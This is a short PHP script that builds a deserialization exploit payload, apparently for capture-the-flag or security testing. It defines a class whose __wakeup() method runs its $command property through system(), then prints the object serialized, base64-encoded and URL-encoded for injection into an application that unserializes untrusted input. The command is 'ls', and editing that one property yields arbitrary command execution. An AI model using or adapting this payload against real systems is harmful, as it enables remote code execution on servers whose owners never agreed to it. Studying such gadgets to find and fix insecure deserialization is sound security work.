<?php
class MyExec {
    public $command = "ls";
    public function __wakeup() {
        system($this->command);
    }
}

print urlencode(base64_encode(serialize(new MyExec())));
?>
